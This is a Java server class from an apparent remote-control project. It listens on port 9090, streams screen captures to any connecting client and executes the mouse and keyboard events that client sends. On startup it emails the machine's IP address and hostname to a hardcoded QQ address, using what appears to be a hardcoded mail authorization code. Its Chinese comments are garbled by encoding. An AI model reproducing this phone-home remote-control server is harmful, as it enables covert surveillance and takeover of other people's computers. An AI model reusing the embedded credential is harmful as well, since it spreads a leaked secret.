package com.pibigstar.main;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.ServerSocket;
import java.net.Socket;
import javax.swing.JOptionPane;
import com.pibigstar.thread.ActionEvent;
import com.pibigstar.thread.SendScreenThread;
import com.pibigstar.util.GetIp;
import com.pibigstar.util.SendEmail;

/**
 * ����ˣ��ȴ����ƶ˵Ľ���
 * @author pibigstar
 *
 */
public class Service {

	private  DataOutputStream dos;
	private  ObjectInputStream ois;
	private final static int port = 9090;

	public static void main(String[] args) throws IOException {
		new Service().startServer(port);
	}

	private void startServer(int port){
		try {
			@SuppressWarnings("resource")
			ServerSocket serverSocket = new ServerSocket(port);
			String ip = GetIp.getHostIp();
			String hostName = GetIp.getHostName();
			System.out.println("server started in:"+ip);
			SendEmail sendEmail = new SendEmail("741047261@qq.com","xtyclmslgccrbdgd");
			sendEmail.sendEmail("741047261@qq.com", "Զ�̿���", "IP:"+ip+":"+port+"������:"+hostName);
			while (true) {
				//�ȴ��ͻ��˵�����
				Socket socket = serverSocket.accept();
				//�õ��ͻ��˵������
				dos = new DataOutputStream(socket.getOutputStream());
				ois = new ObjectInputStream(socket.getInputStream());
				//����������Ļ�̣߳�����Ļ��ͼ���͸��ͻ���
				SendScreenThread screenThread = new SendScreenThread(dos);
				screenThread.start();
				//�����¼������̣߳����Է����͵��¼������ڷ��������һ��
				ActionEvent actionEvent = new ActionEvent(ois);
				actionEvent.start();
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
